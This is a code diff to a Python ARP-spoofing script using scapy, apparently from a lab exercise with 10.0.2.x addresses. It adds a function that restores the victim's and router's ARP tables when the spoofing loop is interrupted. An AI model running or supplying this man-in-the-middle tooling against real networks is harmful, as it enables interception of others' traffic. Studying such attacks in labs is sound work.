@@ -26,6 +26,15 @@ def arp_spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
+def restore(destination_ip, source_ip):
+    '''
+    Restore the state of arp table
+    '''
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, verbose=False)
+
 # To allow the program to keep spoofing the victim and the router
 counter = 0
 try:
@@ -36,7 +45,9 @@ try:
         print(f'\r[+] Packets sent: {counter}', end='')
         time.sleep(2)
 except KeyboardInterrupt:
-    print('\n[+] Exiting Program...')
+    restore('10.0.2.4', '10.0.2.1')
+    restore('10.0.2.1', '10.0.2.4')
+    print('\n[+] Reseting ARP table, exiting program...')
 
 
 
